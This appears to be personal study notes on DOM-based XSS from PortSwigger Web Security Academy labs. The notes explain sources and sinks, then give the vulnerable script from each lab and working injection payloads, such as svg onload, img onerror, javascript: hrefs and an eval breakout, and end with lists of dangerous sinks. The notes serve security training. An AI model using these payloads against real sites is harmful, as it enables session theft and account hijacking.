DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as `eval()` or `innerHTML`. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts. 

### Testing HTML sinks

To test for DOM XSS in an HTML sink, place a random alphanumeric string into the source (such as location.search), then use developer tools to inspect the HTML and find where your string appears. Note that the browser's "View source" option won't work for DOM XSS testing because it doesn't take account of changes that have been performed in the HTML by JavaScript. In Chrome's developer tools, you can use Control+F (or Command+F on MacOS) to search the DOM for your string. 

For each location where your string appears within the DOM, you need to identify the context. Based on this context, you need to refine your input to see how it is processed. For example, if your string appears within a double-quoted attribute then try to inject double quotes in your string to see if you can break out of the attribute.

Note that browsers behave differently with regards to URL-encoding, Chrome, Firefox, and Safari will URL-encode location.search and location.hash, while IE11 and Microsoft Edge (pre-Chromium) will not URL-encode these sources. If your data gets URL-encoded before being processed, then an XSS attack is unlikely to work. 

### Testing JavaScript execution sinks
Testing JavaScript execution sinks for DOM-based XSS is a little harder. With these sinks, your input doesn't necessarily appear anywhere within the DOM, so you can't search for it. Instead you'll need to use the JavaScript debugger to determine whether and how your input is sent to a sink.

For each potential source, such as location, you first need to find cases within the page's JavaScript code where the source is being referenced. In Chrome's developer tools, you can use Control+Shift+F (or Command+Alt+F on MacOS) to search all the page's JavaScript code for the source.

Once you've found where the source is being read, you can use the JavaScript debugger to add a break point and follow how the source's value is used. You might find that the source gets assigned to other variables. If this is the case, you'll need to use the search function again to track these variables and see if they're passed to a sink. When you find a sink that is being assigned data that originated from the source, you can use the debugger to inspect the value by hovering over the variable to show its value before it is sent to the sink. Then, as with HTML sinks, you need to refine your input to see if you can deliver a successful XSS attack. 

### Lab: DOM XSS in document.write sink using source location.search
There's a sink that we can use for DOM based xxs: `document.write`.

There's also an input field on the page which is used for a website search. Whatever we specify in that input is reflected in the url: 
```
https://ff.web-security-academy.net/?search=<whatever we wrote in the input>
```

On the page we have a script:
```bash
<script>
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}
</script>
```

That script gets value from the url `search` param and create a new img tag `src` of which contains value that was specified in the url after `?search=`.

As a result that script creates an html element:
```
<img src="/resources/images/tracker.gif?searchTerms=random">
```

So we can write into the search input the following:
```
"><svg onload=alert(1)>
```
which will still create an img but after it'll create a new `svg` element with `onload` event on it.
```
<img src="/resources/images/tracker.gif?searchTerms=">
<svg onload="alert(1)">"&gt;</section></svg>
```
And our script will be executed

**BTW**: `fff" onload="alert()` also works, instead of creating another svg element it'll append `onload` event to that `img`:
```
<img src="/resources/images/tracker.gif?searchTerms=fff" onload="alert()">
```

### Lab: DOM XSS in document.write sink using source location.search inside a select element
There's a js script:
```bash
<script>
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
</script>
```
As you can see it reads value of `storeId` from the url and creates a `<option selected>...` of that value.
It's interesting that when we visit this url from a website we don't really have `storeId` in the url, in the url we have `productId`:
```
https://ff.web-security-academy.net/product?productId=1
```
So we try to add `storeId`:
```
https://ff.web-security-academy.net/product?productId=1&storeId=hi
```
And we see that it is reflected on the page (thanks to the js script shown above):
```
<select name="storeId">
<option selected="">hi</option>
<option>London</option>
<option>Paris</option>
<option>Milan</option>
</select>
```

We can simply change the url to:
```
https://ff.web-security-academy.net/product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
```
Or sometimes a bit simpler (browser will close the element for us therefore we don't need `">`):
```
https://ff.web-security-academy.net/product?productId=1&storeId=HI</select><img%20src=1%20onerror=alert(1)>
```
Which will create the following DOM:
```bash
<select name="storeId">
    <option selected="">"&gt;</option>
</select>
<img src="1" onerror="alert(1)">
<option>London</option>
<option>Paris</option>
<option>Milan</option>
<button type="submit" class="button">Check stock</button>
...
```

### Lab: DOM XSS in innerHTML sink using source location.search
There's a script:
```
<script>
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}
</script>
```

`innerHTML` is our sink that we can use for xss.

In the url we do:
```
https://ff.web-security-academy.net/?search=<img src=1 onerror=alert(1)>
```

Which will later change the `.innerHTML` of `#seachMessage` html element according to the script above

> Note: The value of the src attribute is invalid and throws an error. This triggers the onerror event handler, which then calls the alert() function.

### Lab: DOM XSS in jQuery anchor href attribute sink using location.search source
There's a script:
```
<script>
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
</script>
```
There's also an HTML element:
`<a id="backLink" href="/">Back</a>`

In jQuery `$('#backLink')` means get element with the id of `backLink` and `.attr("href", "/whatever")` means set value of `href` attribute to `/whatever`
As you can see from the script above, it'll set `href` to whatever is specified in the `url`'s param `?returnPath`

Therefore we can change the url:
```
https://ff.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
```

As a result we'll get:
```
<a id="backLink" href="javascript:alert(document.cookie)">Back</a>
```

### Lab: DOM XSS in jQuery selector sink using a hashchange event 
Not done yet

### Lab: Reflected DOM XSS
There's an endpoint:
```
/?search=hi
```
Whatever is specified in the `?search` url query - is reflected in the server response:
```
{"results":[],"searchTerm":"hi"}
```
When we explore the website we also notice that there's a script that has:
```bash
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        eval('var searchResultsObj = ' + this.responseText);
        displaySearchResults(searchResultsObj);
    }
};
xhr.open("GET", path + window.location.search);
xhr.send();
```
Pay attention to `eval` function. `this.responseText` will contain:
```
{"results":[],"searchTerm":"hi"}
```

Therefore if we change url to:
```
/?search=\"}; alert()//
```
we'll get:
'{"results":[],"searchTerm":"\\\\"}; alert()//"}'
And `alert()` will be executed

### Lab: Stored DOM XSS
There's a function:
```
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
```
And after we post a comment on the site we get back a response and in the script we append the response to DOM via `.innerHTML`:
```
if (response.comment.body) {
    let commentBodyPElement = document.createElement("p");
    commentBodyPElement.innerHTML = escapeHTML(response.comment.body);

    commentSection.appendChild(commentBodyPElement);
}
```
The escape function is flawed in a way that `replace` only replaces 1 character, therefore we can easily use the following exploit:
```
<><img src=1 onerror=alert(1)>
```


### Which sinks can lead to DOM-XSS vulnerabilities?
The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:
```
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```

The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:
```
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

